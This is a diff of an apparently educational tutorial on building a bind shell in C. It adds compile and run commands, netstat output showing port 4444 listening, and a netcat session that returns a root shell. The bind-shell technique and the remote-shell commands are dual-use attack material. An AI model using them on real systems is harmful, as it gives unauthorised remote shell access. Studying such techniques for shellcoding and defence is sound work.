@@ -7,7 +7,7 @@
 
 <p style="text-align: justify;">In the first case, it involves opening a listening port on the victim's system so that the attacker can remotely connect to his shell.</p>
 
-First, we'll try to reproduce this behavior using a C program.
+First, we'll try to reproduce this behavior using a program written in C.
 
 ```c
 #include <stdio.h>
@@ -45,8 +45,27 @@ int main(int argc, char **argv)
 	return 0;
 }
 ```
+Let's compile and execute it.
+```sh
+$ gcc bind_shell.c -o bind_shell
+$ ./bind_shell
+```
+Second terminal:
+```sh
+$ netstat -antp
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 127.0.1.1:53            0.0.0.0:*               LISTEN      1277/dnsmasq    
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      553/sshd        
+tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      30929/bind      
+tcp        1      0 172.16.237.211:59728    91.189.92.92:80         CLOSE_WAIT  3230/ubuntu-geoip-p
+tcp6       0      0 :::22                   :::*                    LISTEN      
 
-<p style="text-align: justify;">As we can see, in order to create a properly working program, it is necessary to use several so-called system calls. In this case, they are:</p>
+$ nc localhost 4444
+whoami
+root
+```
+<p style="text-align: justify;">Excellent, the port was opened, and then you can access it and get the "/bin/sh" shell. As we can see, in order to create a properly working program, it is necessary to use several so-called system calls. In this case, they are:</p>
 
 - sys_socket()
 - sys_bind()
